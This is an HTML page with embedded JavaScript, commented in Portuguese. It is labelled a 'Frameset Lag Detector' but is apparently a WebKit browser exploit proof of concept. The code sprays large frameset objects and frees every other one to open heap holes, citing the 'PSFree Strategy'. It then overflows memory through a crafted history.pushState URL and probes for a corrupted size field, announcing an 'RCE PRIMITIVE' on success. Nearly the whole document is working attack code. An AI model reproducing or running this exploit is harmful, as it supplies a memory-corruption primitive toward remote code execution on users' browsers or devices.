<!DOCTYPE html>
<html>
<head>
    <title>Frameset Lag Detector</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
    </style>
</head>
<body>

    <h1>Frameset Detector (Memory Spike)</h1>
    <p>A prova de corrupção será um erro de 'Out Of Memory' ao ler um único objeto.</p>

    <button onclick="startLagAttack()">INICIAR DETECTOR</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; 

        // Configuração para 4MB (Alinhamento Large Heap)
        const TARGET_SIZE_MB = 4;
        const TARGET_ELEMENTS = (TARGET_SIZE_MB * 1024 * 1024) / 8;
        const ROWS_STRING = ",".repeat(TARGET_ELEMENTS - 2);

        const SPRAY_COUNT = 60; // Quantidade moderada
        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let color = type === 'win' ? '#0f0' : 'cyan';
            el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startLagAttack() {
            log(`1. Alocando ${SPRAY_COUNT} Framesets de 4MB...`);

            // 1. SPRAY
            for(let i=0; i<SPRAY_COUNT; i++) {
                let fset = document.createElement('frameset');
                fset.rows = ROWS_STRING;
                victims.push(fset);
            }

            // 2. BURACOS (PSFree Strategy)
            log("2. Abrindo buracos...");
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims[i].rows = ""; 
                victims[i] = null;
            }

            await forceGC();

            // 3. EXPLOIT
            log("3. Disparando Overflow (Corrompendo '_size')...");
            setTimeout(() => {
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "pwn", "/" + buffer);

                    log("4. Sondando vítimas (Procurando OOM)...");
                    probeVictims();

                } catch (e) {
                    log("Erro no Exploit: " + e.message);
                }
            }, 500);
        }

        function probeVictims() {
            // Varre os sobreviventes
            for(let i=1; i<victims.length; i+=2) {
                let fset = victims[i];
                if(!fset) continue;

                try {
                    // Tenta ler .rows
                    // Se o objeto estiver normal, isso é rápido e retorna uma string de 4MB.
                    // Se estiver CORROMPIDO (size = 0x01... = Petabytes), o WebKit vai tentar
                    // alocar Petabytes de string e falhar com erro.
                    
                    let temp = fset.rows;
                    
                    // Se chegou aqui, leu normal (não foi corrompido)
                    // (Opcional: checar length se não for custoso)
                    
                } catch(e) {
                    // SE DER ERRO AQUI, É SUCESSO!
                    // O erro será algo como "Out of memory" ou "String too long"
                    log(`!!! SUCESSO !!! Vítima ${i} gerou erro ao ler!`, 'win');
                    log(`Erro capturado: ${e.message}`, 'win');
                    alert("RCE PRIMITIVE: FRAMESET SIZE CORRUPTED!");
                    return;
                }
            }
            log("Nenhuma anomalia detectada.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
